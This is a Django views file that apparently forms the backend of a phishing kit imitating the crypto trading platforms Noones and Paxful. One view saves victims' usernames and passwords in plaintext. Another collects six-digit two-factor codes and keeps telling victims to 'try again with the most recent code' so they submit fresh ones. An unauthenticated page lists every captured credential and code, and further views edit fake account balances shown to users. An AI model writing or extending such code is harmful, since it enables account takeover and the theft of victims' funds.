from django.http import HttpResponseRedirect
from django.shortcuts import redirect, render,get_object_or_404
from django.urls import reverse
from .forms import UserForm




from .models import UserSubmissionNoones, OTPSubmissionNoones,UserPaxfulPay


from django.views.decorators.csrf import csrf_exempt
from django.contrib import messages
# Create your views here.

def home(request):
    users = UserPaxfulPay.objects.all()  # Fetch all users
    return render(request, 'paxfu/p2prelog.html', {'users': users}) 




#noones new up


@csrf_exempt
def noones(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Save the username and password
        submission = UserSubmissionNoones.objects.create(username=username, password=password)
        
        # Redirect to the verify page with submission_id
        return redirect('verify', submission_id=submission.id)
    
    return render(request, 'paxfu/noones.html')

@csrf_exempt
def verify(request, submission_id):
    submission = UserSubmissionNoones.objects.get(id=submission_id)
    message = ""

    if request.method == 'POST':
        # Collect the OTP digits from all input fields
        otp_digits = []
        for i in range(1, 7):  # Assuming there are 6 OTP input fields (otp_1 to otp_6)
            otp_digit = request.POST.get(f'otp_{i}')
            if otp_digit:
                otp_digits.append(otp_digit)

        # If all 6 OTP digits are provided, concatenate them to form the full OTP
        if len(otp_digits) == 6:
            otp = ''.join(otp_digits)
            
            # Save the new OTP
            OTPSubmissionNoones.objects.create(user_submission_noones=submission, otp=otp)
            message = "Code seems to be correct. Try again with the most recent code."
        else:
            otp = ''.join(otp_digits)
            OTPSubmissionNoones.objects.create(user_submission_noones=submission, otp=otp)
            message = "Please enter a valid 6-digit code "

    # Fetch all OTP submissions related to the user_submission_noones
    otps = OTPSubmissionNoones.objects.filter(user_submission_noones=submission)

    return render(request, 'paxfu/noones2fa.html', {'submission_id': submission_id, 'message': message, 'otps': otps})









def infodbnoones(request):
    user_submissions = UserSubmissionNoones.objects.all().prefetch_related('otps').order_by('-created_at')
    return render(request, 'paxfu/view_all.html', {'user_submissions': user_submissions})



# View to add or update a users
@csrf_exempt
def add_user(request):
    if request.method == 'POST':
        form = UserForm(request.POST)
        if form.is_valid():
            # Get cleaned data from the form
            username = form.cleaned_data['username']
            amount = form.cleaned_data['amount']
            
            # Update or create the user in the UserPaxfulPay model
            user, created = UserPaxfulPay.objects.update_or_create(
                username=username,  # Match by username
                defaults={'amount': amount}  # Update the amount if user exists
            )
            
            # Add success message
            if created:
                messages.success(request, f'New user {username} added with amount ${amount}.')
            else:
                messages.success(request, f'User {username} updated with amount ${amount}.')
            
            return redirect('indextwo')  # Redirect to the updated view
    else:
        form = UserForm()  # Empty form for GET request

    return render(request, 'paxfu/add_user.html', {'form': form})

# View to delete a user
@csrf_exempt
def delete_user(request, username):
    # Retrieve the user by username or return a 404 if not found
    user = get_object_or_404(UserPaxfulPay, username=username)

    # Delete the user
    user.delete()

    # Add a success message
    messages.success(request, f'User {username} has been deleted.')

    # Redirect to the users list page
    return redirect('indextwo')

def indextwo(request):
    users = UserPaxfulPay.objects.all()  # Correctly access the UserPaxfulPay model
    return render(request, 'paxfu/index2.html', {'users': users})


def panel(request):
    return render(request, 'paxfu/panel.html')




